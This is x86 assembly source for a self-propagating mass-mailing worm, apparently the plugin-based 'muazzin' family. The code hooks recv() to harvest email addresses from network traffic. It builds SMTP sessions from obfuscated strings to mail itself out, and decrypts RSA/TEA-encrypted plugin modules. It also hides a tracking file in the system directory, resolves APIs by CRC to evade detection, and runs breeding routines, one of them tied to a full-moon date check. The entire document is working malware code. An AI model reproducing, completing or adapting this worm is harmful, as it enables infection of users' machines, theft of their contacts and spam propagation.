       mov by [esp+(MAX_PATH+15)+8*4+2*4+(size_muazzin_struc)+1],0

       test dwo [esp+(size_muazzin_struc)+(4*2).Pushad_eax], MT_PROCESSDROPPER
       jz @@nook
       mov ecx, [esp.m_droppersize]             ;extra processing for dropperz
       mov [ebp+(ofs _droppersize-ofs vstart)], ecx
       mov edi, [esp.m_dropper]
       mov [edi-4], ecx

  @@nook:
       test al, MR_ERROR
       jz @@noerr           ;MR_ERROR used only by muazzins with extra param

       mov by [esp+(MAX_PATH+15)+8*4+2*4+(size_muazzin_struc)+1],0
       mov by [esp+(MAX_PATH+15)+8*4+2*4+(size_muazzin_struc)],MR_ERROR

  @@noerr:
       test al, MR_DELETE
       jz @@done
       push dwo [esp+(size_muazzin_struc)+(2*4).Pushad_edx]
       call [ebp+(ofs _DeleteFileA-ofs vstart)]

  @@done:       ;MR_DONE
       add esp, (size_muazzin_struc)
       pop dwo fs:[0]
       pop eax
       push dwo [esp.Pushad_edi]
       call [ebp+(ofs _GlobalFree-ofs vstart)]
       popad
       jmp @@done1
load_muazzin ENDP


include \muazzin\sign\hash.asi


_recv  PROC
       call @@seh
       mov esp, [esp+8]
       mov dwo [esp+8*4], SOCKET_ERROR
  @@exit:
       popad
       pop dwo fs:[0]
       add esp, 4
       ret 4*4

  @@seh:
       push dwo fs:[0]
       mov dwo fs:[0], esp
       push dwo [esp+(2*4)+(4*4)]
       push dwo [esp+(2*4)+(4*4)]
       push dwo [esp+(2*4)+(4*4)]
       push dwo [esp+(2*4)+(4*4)]
       call __oldrecv                   ;do request
       pushad
       xchg ecx, eax
       jecxz @@exit
       inc ecx                          ;SOCKET_ERROR
       jz @@exit
       sub ecx, 32
       jbe @@exit                ;short recv
       add ecx, 16
       mov esi, [esp+(8*4)+(4*4)]               ;recv() buffer
  @@next:
       lodsb
       cmp al, "@"              ;search @
       je @@check
  @@cont:
       loop @@next
       jmp @@exit

  @@check:
       mov edi, esi
       sub ebp, ebp             ;counter
  @@tryagain:
       dec edi
       inc ebp
       call @@checkchar
       jc @@found_start                 ;found a probable start
       cmp ebp, 12                      ;????@xxxx.yyy
       jbe @@tryagain                   ;username too big?
       sub ebp, ebp             ;make jmp below true...

  @@found_start:
       cmp ebp, 4                       ;????@xxxx.yyy
       jb @@cont                        ;username too small?
       sub ebp, ebp
       mov edx, edi                     ;edx==start of email address
       mov edi, esi
  @@searchend:
       inc edi
       inc ebp
       cmp ebp, 20                      ;xxxx@????????.yyy
       jae @@cont                       ;domain too big?
       cmp by [edi], "."
       jne @@searchend
       cmp by [edi+4], "."              ;.xxx.??
       je @@searchend
       cmp by [edi+3], "."              ;.xx.??
       je @@searchend

       add edi, 5                       ;xxxx@yyyyy.???
       call @@checkchar
       jc @@doit
       dec edi
       call @@checkchar                 ;xxxx@yyyyy.??
       jnc @@cont                       ;hmm...

  @@doit:
       push edx
       call add_queue
       jmp @@cont

  @@checkchar:
       mov ebx, " ,:="                  ;verify is char cant be in email
  @@retry:
       ror ebx, 8
       cmp by [edi-1], bl
       je @@found
       cmp by [edi-1], 0
       je @@found
       cmp by [edi-1], "~"
       je @@found
       cmp by [edi-1], "<"
       je @@found
       cmp by [edi-1], ">"
       je @@found
       cmp bl, "="
       jne @@retry
       test al, ?
     org $-1
  @@found:
       stc
       ret

__oldrecv:
       db 0e9h
oldrecv dd 0
_recv  ENDP


MainMuazzinThread PROC
       pushad
  @@thread_loop:
       push SLEEP_APPZ ;!!!SP1
       call delta
       call [ebp+(ofs _Sleep-ofs vstart)]
       push CRC_POLY
  _dropper1 equ dwo $-4
       push MT_APP
       call load_muazzin         ;end with MR_DONE
       mov dwo [esp], -1
       call [ebp+(ofs _Sleep-ofs vstart)]
       popad
       ret 4
MainMuazzinThread ENDP


include \muazzin\samples\crc32.asi


Thr_Bloom PROC
       pushad
       push MT_BLOOM
       call reproduce                   ;always fertile
       popad
       ret 4
Thr_Bloom ENDP


map_decrypt_muazzin PROC
       pushad
       call delta
       mov by [ebp+(ofs @@done-ofs vstart)], ?
     org $-1
       stc
       movzx eax, by [ebp+(ofs name_index-ofs vstart)]
       mov ecx, CRC_POLY
  cache_table equ $-4
       lea eax, [ecx+eax*8]
       mov [esp.Pushad_eax], eax
       mov ecx, [eax]
       jecxz @@nocached

       mov edi, MUAZZIN_MAX*1024        ;muazzin is cached, dont need load
       push edi
       push 40h
       mov esi, ecx
       call [ebp+(ofs _GlobalAlloc-ofs vstart)]
       test eax, eax
       jz @@done
       xchg edi, eax
       xchg eax, ecx
       push edi
       rep movsb
       pop edi
       mov [esp.Pushad_edi], edi
       jmp @@exec_it

  @@nocached:
       sub eax, eax
       push eax
       push FILE_ATTRIBUTE_NORMAL
       push OPEN_EXISTING
       push eax
       push FILE_SHARE_READ
       push GENERIC_READ
       push edx
       call [ebp+(ofs _CreateFileA-ofs vstart)]
       mov esi, eax
       inc eax
       jz @@done
       mov edi, MUAZZIN_MAX*1024
       push edi
       push 40h
       call [ebp+(ofs _GlobalAlloc-ofs vstart)]
       xchg edi, eax
       test edi, edi
       jz @@done
       push ebx
       mov ebx, esp
       push 0
       push ebx
       push eax
       push edi
       push esi
       call [ebp+(ofs _ReadFile-ofs vstart)]
       xchg esi, [esp]
       call [ebp+(ofs _CloseHandle-ofs vstart)]
       cmp esi, MAX_BLOCK_SIZE
       jb @@done
       test esi, 01111b                 ;isnt 16b aligned?
       jnz @@done
       mov [esp.Pushad_edi], edi
       push edi
       lea edx, [edi+esi+10h]           ;10h bytes after end of muazzin
       add esi, -BN_BYTE
       lea ebx, [edi+esi]
       push esi
       add esp, -(BN_BYTE+8)
       mov edi, esp
       push edi
       push _E_
       push BN_DWORD            ;create E
       pop ecx
       pop eax
       stosd
       sub eax, eax
       rep stosd
       pop edi
       push ebx                         ;from
       push edx                         ;where
       push edi              ;e
       lea eax, [ebp+(ofs rsa_n-ofs vstart)]
       push eax              ;n
       call rsa_modexp_fast             ;decriypt tea_key with RSA
       add esp, (BN_BYTE+8)
       mov ecx, [esp]                   ;[esp]==size in bytes
       shr ecx, 3                       ;number of TEA rounds
       mov edi, [esp+4]                 ;edi==encrypted muazzin
       mov esi, edx                     ;esi==tea32 key
       sub edx, -BN_BYTE                ;edx==end tea32 key
  @@TEA:
       call TEA_Decrypt                        ;encrypt 64b with TEA
       add edi, 64/8
       add esi, 128/8                          ;get next TEA round key
       cmp esi, edx
       jb @@continue
       sub esi, BN_BYTE                        ;back to start of TEA key
  @@continue:
       loop @@TEA
       pop ecx

       mov eax, [esp]
       sub edx, BN_BYTE                ;edx==tea32 key

       push edx                        ;result
       push ecx
       push eax                        ;buffer
       mov eax, [edx+16]
       mov ebx, [edx+20]
       mov ecx, [edx+24]
       mov edi, [edx+28]               ;128b hash
       call tea_hash

       xor edi, [edx+28]
       pop edi                          ;edi==plain muazzin
       jnz @@done

       xor eax, [edx+16]
       jnz @@done
       xor ebx, [edx+20]        ;hash match!
       jnz @@done
       xor ecx, [edx+24]
       jnz @@done

  @@exec_it:
       sub ebp, -(ofs @@gpf-ofs vstart)
       push ebp                        ;handler
       push dwo fs:[ecx]               ;old seh frame
       mov dwo fs:[ecx], esp           ;new ptr 2 seh
       push esp
       inc ebp                  ;@@save_esp 1 byte far than @@gpf
       pop dwo [ebp]                    ;save ESP

       push MT_QUERY                    ;struc.why==query
       push esp                         ;push struc
       call edi                         ;retrieve muazzin info (QUERY)
       pop ebp
       jmp @@fine
  @@gpf:
       mov esp, CRC_POLY
  @@save_esp equ dwo $-4
       jmp @@error
  @@fine:
       call delta
       mov by [ebp+(ofs @@done-ofs vstart)], ?
     org $-1
       clc
  @@error:
       pop dwo fs:[0]
       pop ebp
       xchg [esp.Pushad_eax], eax
       mov [esp.Pushad_ebx], ebx
       mov [esp.Pushad_ecx], ecx
       mov [esp.Pushad_esi], esi
       mov ecx, [eax]
       jecxz @@cache_it
       jmp @@done                       ;kill PIQ
  @@cache_it:
       mov esi, [esp.Pushad_edi]
       push eax
       sub esp, 200h
       push esp
       call get_name_nopath
       lea ecx, [esp+1]         ;skip /
       mov eax, MUAZZIN_MAX*1024
       call shared_alloc_named
       add esp, 200h
       mov edi, eax
       pop eax
       mov [eax], edi
       mov [eax+4], ecx
       mov ecx, MUAZZIN_MAX*1024
       rep movsb
  @@done:
       stc
       popad
       ret 4
map_decrypt_muazzin ENDP


shared_alloc_named PROC
       push ecx
       push eax
       call shared_alloc
       ret
shared_alloc_named ENDP


InstallThread PROC
       pushad
       push esp
       sub ebp, ebp
       push esp
       push 4h                          ;CREATE_SUSPENDED
       push ebp
       push dwo [esp+(5*4)+(8*4)]
       push ebp
       push ebp
       call delta
       call [ebp+(ofs _CreateThread-ofs vstart)]
       xchg ecx, eax
       jecxz @@fuck
       push ecx
       push -15                         ;THREAD_PRIORITY_IDLE
       push ecx
       call [ebp+(ofs _SetThreadPriority-ofs vstart)]
       call [ebp+(ofs _ResumeThread-ofs vstart)]
  @@fuck:
       pop eax
       popad
       ret 4
InstallThread ENDP


shared_alloc_unnamed PROC
       push 0
       push eax
       call shared_alloc
       ret
shared_alloc_unnamed ENDP


;push name \ push size | return: eax=mem \ ecx=handle
shared_alloc PROC
       pushad
       call delta
       sub edi, edi
       push dwo [esp+(8*4)+4+4] ;name
       push dwo [esp+(8*4)+4+4] ;size
       push edi
       push PAGE_READWRITE
       push edi
       push -1
       call [ebp+(ofs _CreateFileMappingA-ofs vstart)]
       test eax, eax
       jz @@shit
       mov [esp+(6*4)], eax
       push dwo [esp+(8*4)+4]
       push edi
       push edi
       push FILE_MAP_WRITE
       push eax
       call [ebp+(ofs _MapViewOfFile-ofs vstart)]
  @@shit:
       mov [esp+(7*4)], eax
       popad
       ret 4*2
shared_alloc ENDP


Thr_Breed PROC
       pushad
       push MT_BREED                    ;a lunar event
       call reproduce
       popad
       ret 4
Thr_Breed ENDP


;push handle / push mem
shared_free PROC
       pushad
       call delta
       push dwo [esp+(8*4)+8]
       sub ebp, -(ofs _UnmapViewOfFile-ofs vstart)
       push dwo [esp+(8*4)+8]
       call [ebp]
       call [ebp+(ofs _CloseHandle-ofs _UnmapViewOfFile)]
       popad
       ret 4*2
shared_free ENDP

       db 068h

resAPI:
       crc <GetCurrentProcess>
       crc <ResumeThread>
       crc <SetThreadPriority>
       crc <DeleteFileA>
       crc <Sleep>
       crc <GlobalAlloc>
       crc <GlobalFree>
       crc <CreateThread>
       crc <CreateFileA>
       crc <CloseHandle>
       crc <ReadFile>
       crc <GetModuleHandleA>
       crc <GetProcAddress>
       crc <GetTickCount>
       crc <UnmapViewOfFile>
       crc <MapViewOfFile>
       crc <CreateFileMappingA>
       crc <GetSystemDirectoryA>
       crc <OpenFileMappingA>
       crc <WriteFile>
       crc <LoadLibraryA>
       crc <FreeLibrary>
       crc <SetFilePointer>
       crc <GetFileSize>
       crc <GetFileAttributesA>
       crc <GetSystemTime>
       crc <VirtualProtectEx>
       crc <IsBadCodePtr>
API_NUMB equ ($-resAPI)/4


_IsBadCodePtr dd CRC_POLY
_VirtualProtectEx dd CRC_POLY
_GetSystemTime dd CRC_POLY
_GetFileAttributesA dd CRC_POLY
_GetFileSize    dd CRC_POLY
_SetFilePointer dd CRC_POLY
_FreeLibrary  dd CRC_POLY
_LoadLibraryA dd CRC_POLY
_WriteFile dd CRC_POLY
_OpenFileMappingA dd CRC_POLY
_GetSystemDirectoryA dd CRC_POLY
_CreateFileMappingA dd CRC_POLY
_MapViewOfFile  dd CRC_POLY
_UnmapViewOfFile dd CRC_POLY
_GetTickCount   dd CRC_POLY
_GetProcAddress dd CRC_POLY
_GetModuleHandleA dd CRC_POLY
_ReadFile     dd CRC_POLY
_CloseHandle  dd CRC_POLY
_CreateFileA  dd CRC_POLY
_CreateThread dd CRC_POLY
_GlobalFree   dd CRC_POLY
_GlobalAlloc  dd CRC_POLY
_Sleep        dd CRC_POLY
_DeleteFileA  dd CRC_POLY
_SetThreadPriority dd CRC_POLY
_ResumeThread dd CRC_POLY
_GetCurrentProcess dd CRC_POLY


enum_muazzins PROC
       pushad
       sub esp, MAX_PATH+15
       mov edi, [esp+(8*4)+4+(MAX_PATH+15)]
       sub eax, eax
       push edi
       push (32*12)/4
       pop ecx
       rep stosd
       pop edi
       call delta
       mov by [ebp+(ofs minst-ofs vstart)], al
       sub ebp, -(ofs name_index-ofs vstart)
       mov by [ebp], al
  @@next:
       mov edx, esp
       push edi
       push edx
       push edx
       call get_name
       call map_decrypt_muazzin      ;decrypt muazzin and call QUERY
       jnc @@fine
       pop edi
       add edi, menum_sizeof
       push esp
       call dwo [ebp+(ofs _DeleteFileA-ofs vstart)-(ofs name_index-ofs vstart)]
  @@fuck:
       inc by [ebp]
       cmp by [ebp], 32
       jb @@next
  @@done:
       sub esp, -(MAX_PATH+15)
       popad
       ret 4

  @@fine:
       inc by [ebp+(ofs minst-ofs vstart)-(ofs name_index-ofs vstart)]
       xchg edi, [esp]          ;[esp]=entry/edi=muazzin_table
       xchg eax, esi
       stosd                            ;kind (respond-to)
       xchg eax, ebx
       stosd                            ;type
       xchg eax, ecx
       stosd                            ;version
       call [ebp+(ofs _GlobalFree-ofs name_index)]      ;free muazzin code
       jmp @@fuck
enum_muazzins ENDP


saferecv PROC
       pushad
       call delta
  @@retry:
       push ebp
       sub ebp, -(ofs _recv2-ofs vstart)
       call __do_ebp
       pop ebp
       jnz __done                      ;packet received
       call __check_error_type
       jz @@retry
       jnz __fim                        ;w0w
saferecv ENDP

       db 0e8h

__do_ebp:
       push 0
       push dwo [esp+12+(8*4)+4+4+4]
       push dwo [esp+12+(8*4)+4+4+4]
       push dwo [esp+12+(8*4)+4+4+4]
       call dwo [ebp]
       mov ebx, eax
       inc ebx
       ret

__check_error_type:
       call [ebp+(ofs _WSAGetLastError-ofs vstart)]
       add eax, -10035                     ;EWOULDBLOCK
       ret

       db 0b9h

safesend PROC
       pushad
       call delta
  @@retry:
       push ebp
       add ebp, (ofs _send2-ofs vstart)
       call __do_ebp
       pop ebp
       jnz __done                      ;packet send!
       call __check_error_type
       jz @@retry                      ;retry if problem is blocking
__fim:
       stc
       db 0b0h
__done:
       clc
       mov [esp+(7*4)], eax
       popad
       ret 3*4
safesend ENDP


include \base64.asi


get_name_index PROC
       pushad
       call delta
       mov [ebp+(ofs name_index-ofs vstart)], cl
       jmp __1
get_name_index ENDP


sbox   PROC
       pushad

       push 8
       push dwo [esp]
       pop ecx
       call delta
       lea esi,[ebp+(ofs vname-ofs vstart)]
       mov ah,[esi+(ofs generation-ofs vname)]
       mov al,ah
       and al,011b
       sub by [esi+(ofs @@modifier1-ofs vname)],al
       sub by [esi+(ofs @@modifier2-ofs vname)],al

       lea ebp,[edi-12]
  @@init_sbox:
       lodsb
       xor al,[ebp+ecx]
       add al,[esi+(ofs generation-ofs vname)+ecx-8-1]
       sub ah,al
       loop @@init_sbox

       push 12
       movsx eax,ah
       pop ecx
       xchg [esp],ecx
  @@modify:
       bt eax,ecx
       jnc @@mod_1
  @@mod_0:
       inc by [ebp+ecx+3]
  @@modifier1 equ $-1
       jmp @@mod_2
  @@mod_1:
       dec by [ebp+ecx+3]
  @@modifier2 equ $-1
  @@mod_2:
       loop @@modify

       mov by [esi+(ofs @@modifier1-ofs vname)-8],3
       mov by [esi+(ofs @@modifier2-ofs vname)-8],3

       mov esi,edi
       std
       pop ecx
       lodsb
  @@fix:
       lodsb
       cmp al,'Z'
       ja @@sub_a
       sub al,'A'
       jnc @@skipz
       add by [esi+1],'Z'-'A'
       jmp @@fixed
  @@sub_a:
       sub by [esi+1],'Z'-'A'
  @@fixed:
       inc esi
       jmp @@fix
  @@skipz:
       loop @@fix
       cld

       popad
       ret
sbox   ENDP


sendmail PROC
       pushad
       push 0
       push 1
       push 2
       call delta
       call [ebp+(ofs _socket-ofs vstart)]
       mov ebx, eax
       inc eax
       jz @@fudeu
       push ebx                         ;ebx=socket

       sub esp, 100h
       mov edi, esp                     ;get buffer for email addy
       mov esi, [esp+(8*4)+100h+4+4]
  @@search:
       lodsb
       sub al, "@"
       jnz @@search             ;busca @
       mov eax, "ptms"
       stosd
       xor al, "." xor "s"
       stosb
       call strlen
       jecxz @@tested
       rep movsb                ;yyyy@xxxxx.com -> smtp.xxxxx.com
       xchg eax, ecx
       stosb
       push esp
       call [ebp+(ofs _gethostbyname-ofs vstart)]
       xchg eax, ecx
       test ecx, ecx
       jnz @@tested
       push esp
       add ecx, "ptms" xor "liam"
       xor [esp+4], ecx         ;yyyy@xxxxx.com -> mail.xxxxx.com
       call [ebp+(ofs _gethostbyname-ofs vstart)]
       xchg eax, ecx
  @@tested:
       sub esp, -100h           ;release stack buffer for email address
       test ecx, ecx
       jz @@nodomainserver      ;try to use default server

       mov eax, [ecx.h_list]
       clc
  @@again:
       cmc
       xchg eax, esi            ;eax        = stmp server inet addr
       lodsd                    ;[esp]      = socket
       jc @@again

  @@connect:
       push edx
       sub ebx, ebx
       push ebx
       push ebx                 ;sin_zero
       push eax                 ;sin_addr
       push 19000002h           ;sin_port sin_family
       mov ebx, esp
       push 10h
       push ebx
       push dwo [esp+(7*4)]
       call [ebp+(ofs _connect2-ofs vstart)]
       sub esp, -4*4
       test eax, eax
       pop edx
       jnz @@fudeu1

ZBUFFER = 01a7h
       sub esp, ZBUFFER
       mov ebp, esp
       push ZBUFFER
       push ebp
       push dwo [esp+ZBUFFER+(2*4)]
       call saferecv                    ;get server intro
       jc @@release

       push ebp
       mov eax, "OLEH" xor "FABI"
       push 100h
       mov edi, ebp
       xor eax, "FABI"
       stosd
       sub eax, "OLEH"-0000a0d20h
       stosb
       mov esi, edi
       push esi
       call delta
       call [ebp+(ofs _gethostname-ofs vstart)]
       test eax, eax
       jnz @@00000002
       call strlen
       add edi, ecx
 @@00000002:
       mov ax, 0a0dh
       stosw
       pop ebp
       sub edi, ebp
       call @@send_and_get_ok           ;HELO

       push 6
       mov dwo [ebp], "TESR"
       mov dwo [ebp+4], 0a0dh
       pop edi
       call @@send_and_get_ok           ;RSET

       mov eax, "LIAM" - "FABI"
       mov edi, ebp
       add eax, "FABI"
       stosd
       xor eax, "LIAM" xor "ORF "
       push (4*4)-1
       stosd
       xor eax, "ORF " xor "< :M"
       stosd
       xor eax, "< :M" xor 000a0d00h+">";>0D0A
       stosd
       pop edi
       call @@send_and_get_ok           ;MAIL FROM: <>

       mov eax, "TPCR" + "FABI"
       mov edi, ebp
       sub eax, "FABI"
       stosd
       xor eax, "TPCR" xor ":OT "
       stosd
       xor ah, "T" xor "<"
       stosw
       mov esi, [esp+(8*4)+ZBUFFER+4+4]
       call strlen
       jecxz @@00000001
       rep movsb
  @@00000001:
       xor eax, ":O< " xor 000a0d3eh
       stosd
       dec edi
       sub edi, ebp
       call @@send_and_get_ok           ;RCTP TO:

       push 6
       xor dwo [ebp], " 052" xor "ATAD"
       mov wo [ebp+4], 0a0dh
       pop edi
       call @@send_and_get_data         ;DATA

       push ebp                         ;send text
       mov esi, [esp+(8*4)+ZBUFFER+16]
       call strlen
       jecxz @@00000003
       push ecx
       push esi

       push dwo [esp+ZBUFFER+(2*4)+4]
       call safesend                    ;send all in 1 send() (!!!)
       jc @@release1
  @@00000003:
       pop ebp

       push 5
       mov dwo [ebp], 0d2e0a0dh
       mov wo [ebp+4], 0ah
       pop edi
       call @@send_and_get_ok           ;.

       push 6
       xor dwo [ebp], " 052" xor "TIUQ"
       mov wo [ebp+4], 0a0dh
       pop edi                          ;QUIT

       push ebp                         ;bogus ret address

  @@send_and_get_data:
       mov eax, " 453"
       jmp @@send_and_get_reply
  @@send_and_get_ok:
       mov eax, " 052"
  @@send_and_get_reply:
       push ebp
       call delta
       mov [ebp+(ofs @@waitfor-ofs vstart)], eax
       pop ebp
       push edi
       push ebp
       push dwo [esp+ZBUFFER+(2*4)+4]
       call safesend                           ;send
       jc @@release1
       push ZBUFFER
       push ebp
       push dwo [esp+ZBUFFER+(2*4)+4]
       call saferecv                           ;recv
       jc @@release1
       cmp dwo [ebp], CRC_POLY
  @@waitfor equ dwo $-4
       jne @@release1                          ;was the right reply?
       ret

  @@nodomainserver:
       push 0
       push esp                        ;get smtp server from muazzinz
       push -1
       push MT_BLOCKIP
       call load_muazzin
       pop eax                          ;MR_ERROR/MR_OK
       pop eax
       pop ecx
       jecxz @@fudeu1
       jc @@fudeu1              ;no muazzin did our request
       xchg eax, ecx
       jmp @@connect             ;eax==default smtp server

  @@release1:
       pop ebp                                 ;remove ret address and close
  @@release:
       add esp, ZBUFFER
  @@fudeu1:
       call delta
       call [ebp+(ofs _closesocket-ofs vstart)]
  @@fudeu:
       popad
       ret 2*4
sendmail ENDP


CheckInet PROC
       pushad
       call delta
       push (@@over1-@@over0)/4
       call @@over1
  @@over0:
IF WININET EQ TRUE
       dd "INIW" xor CRC_POLY
       dd ".TEN" xor CRC_POLY
       dd  "LLD" xor CRC_POLY           ;WININET.DLL
       dd "etnI" xor CRC_POLY
       dd "tenr" xor CRC_POLY
       dd "CteG" xor CRC_POLY
       dd "enno" xor CRC_POLY
       dd "detc" xor CRC_POLY
       dd "tatS" xor CRC_POLY
       dd    "e" xor CRC_POLY           ;InternetGetConnectedState
ELSEIF RASAPI32 EQ TRUE
       dd "ASAR" xor CRC_POLY
       dd "23IP" xor CRC_POLY
       dd "LLD." xor CRC_POLY           ;RASAPI32.DLL
       dd CRC_POLY
       dd "EsaR" xor CRC_POLY
       dd "Cmun" xor CRC_POLY
       dd "enno" xor CRC_POLY
       dd "oitc" xor CRC_POLY
       dd  "Asn" xor CRC_POLY           ;RasEnumConnections
ENDIF
  @@over1:
       call @@dec_enc
       push dwo [esp]
       push dwo [esp]
       call [ebp+(ofs _LoadLibraryA-ofs vstart)]
       pop esi
       test eax, eax
       xchg esi, eax
       jz @@done_err
IF WININET EQ TRUE
       add eax, 12
ELSEIF RASAPI32 EQ TRUE
       add eax, 16
ENDIF
       push eax
       push esi
       call [ebp+(ofs _GetProcAddress-ofs vstart)]
       test eax, eax
       jz @@done_err
IF WININET EQ TRUE
       sub ecx, ecx
       sub esp, 100h
       push esp
       xchg ecx, [esp]
       push ecx
       call eax                 ;InternetGetConnectedState
       add esp, 100h
       dec eax
       jnz @@done_err
ELSEIF RASAPI32 EQ TRUE
       sub esp, 19ch-4
       push 19ch
       mov ebp, esp
       push 19ch
       mov ecx, esp
       push esp
       push esp                 ;ptr2 numb_of_connections
       push ecx                 ;ptr2 buffersize
       push ebp                 ;ptr2 buffer(first dd=size)
       call eax                 ;RasEnumConnections
       pop ebp
       add esp, 19ch+4
       test eax, eax
       jnz @@done_err
       sub eax, ebp
       jz @@done_err
ENDIF
       test al, ?
     org $-1
  @@done_err:
       stc
       call @@dec_enc
       pop eax eax
       pushf
       push esi
       call delta
       call [ebp+(ofs _FreeLibrary-ofs vstart)]
IF DEBUG EQ FALSE
       push 120*1000
       call [ebp+(ofs _Sleep-ofs vstart)]
ENDIF
       popf
       popad
       ret

  @@dec_enc:
       pushf
       pushad
       mov esi, [esp+8+(8*4)]
       mov ecx, [esp+12+(8*4)]
  @@decr:
       xor [esi], CRC_POLY              ;decrypt stringz
       lodsd
       loop @@decr
       popad
       popf
       ret
CheckInet ENDP


list_manager PROC
       pushad
       add esp, -MAX_PATH
       mov edi, esp
       push MAX_PATH
       push edi
       call delta
       mov by [ebp+(ofs @@in_list-ofs vstart)], ?
     org $-1
       cmp al, ?                        ;default=no error
     org $-1
       call [ebp+(ofs _GetSystemDirectoryA-ofs vstart)]
       push edi
       add edi, eax
       lea esi, [ebp+(ofs vname-ofs vstart)]
       push "\"
       pop eax
       stosb
       shr eax, 8       ;eax=0
       movsd
       movsd
       stosb
       pop edi
       mov esi, eax
       push eax
       push FILE_ATTRIBUTE_HIDDEN
       push OPEN_ALWAYS
       push eax
       push eax
       push GENERIC_READ+GENERIC_WRITE
       push edi
       call [ebp+(ofs _CreateFileA-ofs vstart)]
       mov ebx, eax
       add esp, MAX_PATH
       inc eax
       jz @@error

       cmp dwo [esp+(8*4)+8], esi
       je @@check

       push 2          ;add crc32 to list
       push esi
       push esi
       push ebx
       call [ebp+(ofs _SetFilePointer-ofs vstart)]
       push eax
       mov eax, esp
       push esi         ;overlapped IO
       push eax         ;how much writted
       push 4
       lea eax, [esp+(8*4)+8+(3*4)]
       push eax
       push ebx
       call [ebp+(ofs _WriteFile-ofs vstart)]
       pop eax
       jmp @@close

  @@check:
       push 0           ;check crc in list
       push ebx
       call [ebp+(ofs _GetFileSize-ofs vstart)]
       xchg eax, ecx
       jecxz @@close
       push eax
       mov eax, esp
       push esi
       push eax
       push ecx
       push ecx
       push 40h
       call [ebp+(ofs _GlobalAlloc-ofs vstart)]
       mov edi, eax
       push eax
       push ebx
       call [ebp+(ofs _ReadFile-ofs vstart)]
       pop ecx                          ;edi=buffer
       shr ecx, 2                       ;ecx=numba of dwords
       push edi
       mov eax, [esp+(4*8)+8]
       repne scasd
       jz @@izbad               ;heheh... last entry is the equal?
       jecxz @@izfine
  @@izbad:
       mov by [ebp+(ofs @@in_list-ofs vstart)], 0ebh   ;crc already exists
  @@izfine:
       call [ebp+(ofs _GlobalFree-ofs vstart)]

  @@close:
       push ebx
       call [ebp+(ofs _CloseHandle-ofs vstart)]

  @@in_list equ this byte
       jmp @@error
       test al, ?
     org $-1
  @@error:
       stc
       popad
       ret 4*2
list_manager ENDP


add_queue PROC
       pushad
  @@wait:
       mov ecx, 1                       ;filter to avoid 2 thread access
  into equ dwo $-4                      ;email-linked-list at same time
       jecxz @@wait
       call delta
       sub ebp, -(ofs into-ofs vstart)
       dec dwo [ebp]
       mov esi, [esp+(9*4)]
       sub ecx, ecx
  @@nextc:
       lodsb
       cmp al, """"
       je @@donec
       cmp al, 0dh
       je @@donec
       cmp al, 0ah
       je @@donec
       cmp al, ">"
       je @@donec
       test al, al
       jz @@donec
       inc ecx
       jmp @@nextc
  @@donec:
       jecxz @@error
       push ecx
       sub ecx, -10h      ;dword(ptr2prev)+dword(handle2)+dword(crc32)+string[]+byte(nul)
       mov eax, ecx
       call shared_alloc_unnamed
       test eax, eax
       pop edx                  ;edx=size
       jz @@error
       mov esi, [ebp+(ofs _queue1-ofs into)]
       mov edi, eax
       xchg eax, [esi]          ;queue->new buffer
       stosd                               ;newbuffer.ptr2previous
       xchg ecx, edx
       xchg eax, edx
       stosd                    ;newbuffer.mem handle 2
       mov esi, [esp+(9*4)]
       rep movsb                           ;string
       xchg ecx, eax
       stosb                               ;nul
  @@error:
       inc dwo [ebp]
       popad
       ret 4
add_queue ENDP


full_moon PROC
       pushad
       sub esp, 16
       push esp
       call delta
       call [ebp+(ofs _GetSystemTime-ofs vstart)]
       pop edx                          ;year/month
       pop ebx                          ;dayofweek/day
       pop eax                          ;hour/minute
       pop eax                          ;sec
       ;21/1/2000 -  lua cheia
       shr ebx, 16
       movzx ebx, bx            ;ebx=total days
       sub dx, 2000
       jc @@no_night            ;before 2000
       movzx ecx, dx
       shr edx, 16
       movzx eax, dx            ;eax=month
  @@next_year:
       test cl, 011b
       jnz @@normal_year
       inc ebx                  ;bissext - 1 day more
  @@normal_year:
       jecxz @@still2000        ;ecx=years past 2000
       add ebx, 365             ;add year days
       loop @@next_year
  @@still2000:
       mov edx, ecx
       dec eax
       jz @@full_month
       add ebx, 31              ;janeiro
       dec eax
       jz @@full_month
       add ebx, 28              ;fevereiro
       dec eax
       jz @@full_month
       add ebx, 31              ;mar‡o
       dec eax
       jz @@full_month
       add ebx, 30              ;abril
       dec eax
       jz @@full_month
       add ebx, 31              ;maio
       dec eax
       jz @@full_month
       add ebx, 30              ;junho
       dec eax
       jz @@full_month
       add ebx, 31              ;julho
       dec eax
       jz @@full_month
       add ebx, 31              ;agosto
       dec eax
       jz @@full_month
       add ebx, 30              ;setembro
       dec eax
       jz @@full_month
       add ebx, 31              ;outubro
       dec eax
       jz @@full_month
       add ebx, 30              ;novembro
       dec eax
       jz @@full_month
       add ebx, 31              ;dezembro
  @@full_month:
       sub ebx, 21
       shl ebx, 1
       mov eax, 29+29+1
       xchg eax, ebx
       div ebx
       test edx, edx
       jz @@lua_cheia
       dec edx
       jz @@lua_cheia
       cmp dl, 29+29-1
       jnz @@no_night
  @@lua_cheia:
       test al, ?       ;hoje a noite ‚ lua cheia ;)
     org $-1
  @@no_night:
       stc
       popad
       ret
full_moon ENDP

align 4

       dd -1                                    ;end of worm code

muazzin macro name, version, file
local a,b
a equ $
include &file&
b equ $
       db "&name&"
       dd version
       dd b-a
MUAZZINS = MUAZZINS + 1
endm

MUAZZINS = 0

;muazzin h_2k, 002h, \stuff\muazzins\happy2k.inc
;muazzin poly, 100h, \stuff\muazzins\poly.inc
;muazzin avip, 100h, \stuff\muazzins\avinet.inc
;muazzin news, 201h, \stuff\muazzins\news.inc
;muazzin pdll, 100h, \stuff\muazzins\poly_dll.inc
;muazzin @@@@, 200h, \stuff\muazzins\spirale.inc
;muazzin serv, 003h, \stuff\muazzins\server.inc
;muazzin d2av, 102h, \stuff\muazzins\antiav.inc

vend   equ this byte


end    init
